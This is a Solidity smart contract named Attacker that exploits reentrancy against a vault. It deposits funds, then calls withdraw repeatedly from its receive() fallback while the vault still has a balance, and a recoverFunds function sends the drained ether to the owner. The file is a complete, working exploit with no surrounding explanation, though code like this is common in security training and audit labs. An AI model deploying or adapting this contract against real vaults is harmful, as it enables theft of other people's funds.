// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function vaultBalance() external view returns (uint256);
}

contract Attacker {
    IVault public vault;
    address public owner;
    uint256 public attackAmount;
    uint256 public reentries;

    constructor(address _vault) {
        require(_vault != address(0), "Invalid vault");
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value > 0, "Send POT");
        require(attackAmount == 0, "Already attacked");

        attackAmount = msg.value;

        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (
            msg.sender == address(vault) &&
            reentries < 2 &&
            address(vault).balance >= attackAmount
        ) {
            reentries++;
            vault.withdraw();
        }
    }

    function attackerBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function recoverFunds() external {
        require(msg.sender == owner, "Only owner");

        (bool ok, ) = payable(owner).call{
            value: address(this).balance
        }("");

        require(ok, "Transfer failed");
    }
}